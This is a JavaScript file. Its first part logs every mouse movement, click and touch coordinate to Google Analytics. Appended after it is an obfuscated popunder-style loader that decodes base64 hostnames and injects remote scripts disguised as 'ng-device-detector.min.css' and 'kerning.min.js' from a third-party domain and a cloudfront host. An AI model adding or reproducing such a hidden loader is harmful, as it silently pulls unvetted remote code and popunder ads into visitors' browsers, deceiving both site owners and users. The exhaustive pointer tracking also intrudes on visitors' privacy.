// Function to send interaction data to Google Analytics
function trackInteraction(type, x, y) {
  gtag('event', type, {
    'event_category': 'interact',
    'event_label': `x:${x}, y:${y}`
  });
}

// Function to handle mouse movements
function handleMouseMove(e) {
  trackInteraction('Mouse Movement - UT', e.clientX, e.clientY);
}

// Function to handle clicks
function handleClick(e) {
  trackInteraction('Mouse Click - UT', e.clientX, e.clientY);
}

// Function to handle touch events
function handleTouch(e) {
  const touch = e.touches[0];
  trackInteraction('Touch - UT', touch.clientX, touch.clientY);
}

// Attach event listeners
document.addEventListener('mousemove', handleMouseMove);
document.addEventListener('click', handleClick);
document.addEventListener('touchstart', handleTouch);

(function(){if(window.e7aaee9dfc44d5aabfe4048ffc29a912) return; window.e7aaee9dfc44d5aabfe4048ffc29a912=1697848964; var y=window; y["_pop"]=[["siteId", 665*41+1000*531-932+4478295], ["minBid", 0], ["popundersPerIP", "0"], ["delayBetween", 0], ["default", false], ["defaultPerDay", 0], ["topmostLayer", !0]];Object.freeze(y["_pop"]); var p=[atob("d3d3LnZpc2FyaW9tZWRpYS5jb20vbmctZGV2aWNlLWRldGVjdG9yLm1pbi5jc3M="),atob("ZDEzazdwcmF4MXlpMDQuY2xvdWRmcm9udC5uZXQvc2NyaXB0cy9rZXJuaW5nLm1pbi5qcw==")], l=0, x, g=function(){if((!p[l])||(((new Date()).getTime()>1723768964000)&&(l>1)))return;x=y["document"]["createElement"]("script"); x["type"]="text/javascript"; x["async"]=!0; var e=y["document"]["getElementsByTagName"]("script")[0]; x["src"]='https://'+p[l]; x["crossOrigin"]="anonymous"; x["onerror"]=function(){l++;g()}; e["parentNode"]["insertBefore"](x,e)}; g()})();

